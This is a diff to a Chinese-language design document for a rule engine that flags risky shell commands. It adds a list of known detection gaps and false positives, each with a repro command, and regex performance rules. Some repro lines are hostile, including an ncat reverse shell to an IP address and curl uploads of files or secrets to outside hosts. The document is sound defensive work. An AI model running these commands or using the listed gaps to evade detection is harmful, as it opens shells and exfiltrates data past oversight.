@@ -126,6 +126,33 @@ MVP 规则主要消费 ShellCommand 与 FileWrite；NetworkRequest / McpToolCall
 
 规则 = 一个纯函数 `(事件, 上下文) -> list[Finding]`。Finding 含：规则 ID、严重度、事件证据、解释、建议。跨命令模式（如 E005）允许规则维护会话内短程状态。
 
+### 6.1 已知检测缺口与误报(v0.2 待办)
+
+实现期审查发现的记录,每条附复现命令;v0.2 规则调优从这里分诊,不回溯 v0.1:
+
+**漏报(变体未覆盖)**
+- `ncat --exec /bin/sh 1.2.3.4 4444`(U005 只覆盖 nc/socat)
+- `curl -T file https://x.com`(E001 只覆盖 -F/-d@ 上传)
+- `aws s3 cp s3://b/.env .`(云 CLI 外发不在 E 系范围)
+- `curl https://hooks.slack.com/services/...`(E003 目的地列表无 slack webhook)
+- `chmod 7777 /x`(D003 保守漏报)、`chmod a+rwx /x`
+- `sh -c "sudo rm x"`、`/usr/bin/sudo x`(B006 前缀类缺 `/"'`)
+- `tar cf out.tar src`(D/E005 无短横线 tar 形态)、`zip -r "my proj.zip"`(引号名)
+- `1169.254.169.254`(U003 只防右侧子域伪装,无 lookbehind)
+
+**误报(可接受但可调优)**
+- `tail -f .env.watchdog` 误中 C001(`\.env\b` 后跟 `.` 视为边界)
+- `cat id_rsa.pub` 误中 C002(公钥读取)
+- `cat config/production.pem.bak` 误中 C002(可接受:仍是密钥材料)
+- `npm install --registry https://...` 误中 U004(LOW,可接受)
+- `echo sudo x` 误中 B006(设计如此:sudo 出现即提示)
+- E005 子串匹配:打包 `a.zip` 后上传 `nota.zip` 会命中
+
+**性能约定(实现期确立,新规则必须遵守)**
+- 正则中缀跨度一律 `{0,400}`(B001 allow-list 扫描 `{0,2000}`),禁止双中缀链
+- 路径类必须 `\b` 前缀 + `{1,200}` 上限(C002/E005 教训:`.`/`/` 是类内非词字符,每个词→标点转移都是新回溯起点)
+- 对抗基线:320KB 重复锚点输入,单规则 <500ms
+
 ## 7. 架构
 
 ```
